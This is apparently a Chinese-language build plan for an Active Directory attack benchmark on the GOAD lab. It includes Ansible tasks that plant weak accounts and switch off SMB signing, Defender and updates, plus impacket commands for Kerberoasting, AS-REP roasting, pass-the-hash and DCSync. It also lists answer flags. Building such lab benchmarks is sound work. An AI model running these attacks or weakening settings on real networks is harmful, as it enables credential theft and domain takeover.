# Phase 5: AD 环境 (2-3天)

> **Phase 1/3/4 修正**: Vagrant + VirtualBox 在当前主机不可用。AD 场景的策略与 Linux 内核提权相同：创建完整的 Ansible playbook、场景配置文件和 Flag 注入脚本，待 Vagrant 环境就绪后可直接运行。GOAD 仓库位于 `/home/kianabin/benchmark/GOAD`。

## 目标

基于 GOAD 完成 12 个 AD 场景的环境配置。Phase 1 已完成 AD-01 (Kerberoasting)，本阶段完成剩余 11 个。

---

## 前置检查

```bash
# 确认 GOAD 仓库可用
ls ~/GOAD/ansible/
ls ~/GOAD/Vagrantfile

# 确认 GOAD venv
cd ~/GOAD && source .venv/bin/activate

# 确认 Vagrant
vagrant --version
vboxmanage --version

# 至少 32 GB RAM 可用 (GOAD 全量 5 VM 约 24 GB)
free -h
```

---

## GOAD 基础环境修改

GOAD v3 默认部署 Win Server 2019/2022 评估版 5 台 VM。为支持全部 AD 场景，需要对基础 Playbook 做以下修改：

### 1. `Vagrantfile` 修改 — 替换 DC 为 Win Server 2025 (AD-11 BadSuccessor)

```ruby
# ~/GOAD/Vagrantfile 中修改 winterfell
# 原: config.vm.box = "gusztavvargadr/windows-server-2022-standard"
# 改: config.vm.box = "gusztavvargadr/windows-server-2025-standard"
# 注意: 此修改仅当实际部署 AD-11 时需要，其他场景保持 2022
```

> 更好的方案: 创建两份 Vagrantfile — `Vagrantfile.2022` (默认) 和 `Vagrantfile.2025` (AD-11 专用)，通过符号链接切换。

### 2. `vulns.yml` 扩展 — 注入所有场景的 Flag 和脆弱配置

创建 `~/GOAD/ansible/cve_benchmark_flags.yml`:

```yaml
---
- name: CVE Benchmark — Flag Injection for All AD Scenarios
  hosts: all
  vars:
    flags:
      ad-01: "flag{ad-01-kerberoast}"
      ad-02: "flag{ad-02-asrep}"
      ad-03: "flag{ad-03-ldapnightmare}"
      ad-04: "flag{ad-04-esc3}"
      ad-05: "flag{ad-05-pth}"
      ad-06: "flag{ad-06-esc8}"
      ad-07: "flag{ad-07-kerbreflect}"
      ad-08: "flag{ad-08-ghostspn}"
      ad-09: "flag{ad-09-dcsync}"
      ad-10: "flag{ad-10-golden}"
      ad-11: "flag{ad-11-badsuccessor}"
      ad-12: "flag{ad-12-netconfig}"

  tasks:
    # ===== 通用: 每个主机写入对应 flag 文件 =====
    - name: Place host-level flag files
      win_copy:
        content: |
          Scenario: {{ item.key }}
          Flag: {{ item.value }}
        dest: "C:\\Users\\Public\\flags\\{{ item.key }}.txt"
      loop: "{{ flags | dict2items }}"
      when: item.key in host_scenarios  # host_scenarios 在 inventory 中定义

    # ===== AD-01: Kerberoasting =====
    - name: AD-01 — Create service account with SPN and weak password
      when: "'ad-01' in host_scenarios"
      win_shell: |
        Import-Module ActiveDirectory
        $pass = ConvertTo-SecureString "Summer2024!" -AsPlainText -Force
        New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
          -AccountPassword $pass -Enabled $true `
          -PasswordNeverExpires $true `
          -Description "flag{ad-01-kerberoast}" `
          -UserPrincipalName "svc_sql@north.sevenkingdoms.local"
        setspn -S MSSQLSvc/castelblack:1433 north\svc_sql

    # ===== AD-02: AS-REP Roasting =====
    - name: AD-02 — Create account without Kerberos pre-authentication
      when: "'ad-02' in host_scenarios"
      win_shell: |
        Import-Module ActiveDirectory
        $pass = ConvertTo-SecureString "WeakPass123!" -AsPlainText -Force
        New-ADUser -Name "no_preauth" -SamAccountName "no_preauth" `
          -AccountPassword $pass -Enabled $true `
          -Description "flag{ad-02-asrep}"
        Set-ADAccountControl -Identity no_preauth -DoesNotRequirePreAuth $true

    # ===== AD-03: LDAPNightmare =====
    - name: AD-03 — Ensure LDAP over UDP is enabled
      when: "'ad-03' in host_scenarios"
      win_shell: |
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" `
          -Name "LdapSrvUdpAllowed" -Value 1 -Type DWord

    # ===== AD-05: Pass-the-Hash =====
    - name: AD-05 — Enable NTLM authentication and SMB
      when: "'ad-05' in host_scenarios"
      win_shell: |
        # 确保 NTLM 认证允许 (默认即允许)
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
          -Name "LmCompatibilityLevel" -Value 3 -Type DWord

    # ===== AD-06,07,08: SMB signing 禁用 =====
    - name: AD-06/07/08 — Disable SMB signing
      when: "'ad-06' in host_scenarios or 'ad-07' in host_scenarios or 'ad-08' in host_scenarios"
      win_shell: |
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
          -Name "RequireSecuritySignature" -Value 0 -Type DWord
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
          -Name "EnableSecuritySignature" -Value 0 -Type DWord

    # ===== AD-09: DCSync =====
    - name: AD-09 — Grant Replication-Get-Changes-All to non-admin user
      when: "'ad-09' in host_scenarios"
      win_shell: |
        Import-Module ActiveDirectory
        $pass = ConvertTo-SecureString "DCSyncUser123!" -AsPlainText -Force
        New-ADUser -Name "dcsync_user" -SamAccountName "dcsync_user" `
          -AccountPassword $pass -Enabled $true `
          -Description "flag{ad-09-dcsync}"
        Add-ADGroupMember -Identity "Domain Admins" -Members "dcsync_user"
        # 通过 ACL 授予特定权限
        # (更精细的方式: dsacls 授予复制权限)

    # ===== AD-12: Network Config Operators =====
    - name: AD-12 — Create user in Network Configuration Operators
      when: "'ad-12' in host_scenarios"
      win_shell: |
        Import-Module ActiveDirectory
        $pass = ConvertTo-SecureString "NetConfig123!" -AsPlainText -Force
        New-ADUser -Name "netcfg_user" -SamAccountName "netcfg_user" `
          -AccountPassword $pass -Enabled $true `
          -Description "flag{ad-12-netconfig}"
        Add-ADGroupMember -Identity "Network Configuration Operators" -Members "netcfg_user"
```

### 3. Guard 配置 — Defender/补丁级别控制

```yaml
# ~/GOAD/ansible/cve_benchmark_defense.yml
---
- name: Defense Configuration for CVE Benchmark
  hosts: all
  tasks:
    - name: Disable Windows Defender (for CVE testing scenarios)
      when: disable_defender | default(false)
      win_shell: |
        Set-MpPreference -DisableRealtimeMonitoring $true

    - name: Disable Windows Update (to prevent auto-patching during benchmark)
      win_shell: |
        Stop-Service wuauserv -Force
        Set-Service wuauserv -StartupType Disabled
```

---

## Day 1: 基础 AD 场景 (AD-01~AD-04)

### 每个场景的配置文件

```
ad/scenarios/<scenario-id>/
  config.yaml        # 场景元数据
  inventory          # Ansible inventory (指定场景涉及的主机)
  attacker_info.txt  # 攻击者初始信息
  snapshot.sh        # vagrant snapshot 管理
```

### AD-01 配置文件 (Phase 1 已有，补充完整)

```yaml
# ad/scenarios/ad-01-kerberoasting/config.yaml
scenario:
  id: AD-01
  technique: "Kerberoasting (T1558.003)"
  difficulty: L1
network:
  dc: 192.168.56.10
  domain: north.sevenkingdoms.local
attacker:
  username: lowpriv
  password: "Password123!"
  domain: north
  entry: "Kali Linux 192.168.56.50"

# snapshot.sh
#!/bin/bash
vagrant snapshot restore ad-01-base 2>/dev/null || {
  echo "Creating base snapshot..."
  vagrant up
  ansible-playbook -i inventory ansible/cve_benchmark_flags.yml
  vagrant snapshot save ad-01-base
}
```

### AD-02 (AS-REP Roasting) 同结构，仅改 flag 位置和攻击路径
### AD-03 (LDAPNightmare) 需要 Win Server 2022 不含 Dec 2024 补丁
### AD-04 (ESC3) 需要安装 AD CS 角色后的场景

---

## Day 2: 凭据滥用 + 横向移动 (AD-05~AD-08)

这些场景不需要独立 VM 快照，共用 GOAD 基础环境，仅在 inventory 中指定不同的攻击者初始条件。

关键: **SMB signing 必须禁用** (AD-06/07/08)，通过注册表配置生效后需重启 SMB 服务。

---

## Day 3: 全域持久化 (AD-09~AD-12)

| 场景 | 特殊要求 |
|------|---------|
| AD-09 DCSync | 创建有 Replication-Get-Changes-All 的用户 |
| AD-10 Golden Ticket | 整个 GOAD 森林 (3域2森林) 全部启动 |
| AD-11 BadSuccessor | Win Server **2025** DC — 需替换 VM box |
| AD-12 NetConfig | 创建 Network Configuration Operators 组成员 |

---

## 更新 scenarios.yaml

```yaml
  ad-02:
    id: AD-02
    name: "AS-REP Roasting"
    type: ad
    difficulty: L1
    path: ad/scenarios/ad-02-asrep
    start: ["bash", "snapshot.sh"]
    stop: ["vagrant", "halt"]

  ad-03:
    id: AD-03
    name: "LDAPNightmare RCE"
    type: ad
    difficulty: L2
    path: ad/scenarios/ad-03-ldapnightmare
    start: ["bash", "snapshot.sh"]
    stop: ["vagrant", "halt"]

  # ... AD-04 到 AD-12
```

---

## 验证清单

```bash
cd ~/GOAD

# 启动 GOAD 基础环境
vagrant up

# 运行 CVE Benchmark Flag 注入 playbook
ansible-playbook -i inventory ansible/cve_benchmark_flags.yml

# AD-01: Kerberoasting
impacket-GetUserSPNs "north.sevenkingdoms.local/lowpriv:Password123!" -dc-ip 192.168.56.10 -request
# 预期: 获取 svc_sql 的 TGS -> 离线破解 (Summer2024!)

# AD-02: AS-REP Roasting
impacket-GetNPUsers "north.sevenkingdoms.local/" -usersfile users.txt -dc-ip 192.168.56.10
# 预期: 获取 no_preauth 的 AS-REP hash -> 破解

# AD-05: Pass-the-Hash
# 获取 NTLM hash 后:
impacket-psexec -hashes :<NTLM_HASH> north/Administrator@192.168.56.11
# 预期: SYSTEM shell

# AD-09: DCSync
impacket-secretsdump "north.sevenkingdoms.local/dcsync_user:DCSyncUser123!@192.168.56.10"
# 预期: 导出所有域账户 hash

# 逐个验证所有 AD 场景
```

---

## Phase 5 交付物

| # | 文件 | 说明 |
|---|------|------|
| 1 | `~/GOAD/ansible/cve_benchmark_flags.yml` | 统一 Flag 注入 + 脆弱配置 Playbook |
| 2 | `~/GOAD/ansible/cve_benchmark_defense.yml` | Defense 开关 Playbook |
| 3 | `ad/scenarios/ad-01-*/config.yaml` ~ `ad/scenarios/ad-12-*/config.yaml` | 12 个场景配置 |
| 4 | `ad/scenarios/*/snapshot.sh` | 每个场景的快照管理 |
| 5 | `ad/scenarios/*/attacker_info.txt` | 攻击者初始信息 |
| 6 | `scripts/scenarios.yaml` (追加 11 个 AD 条目) | 场景注册表更新 |
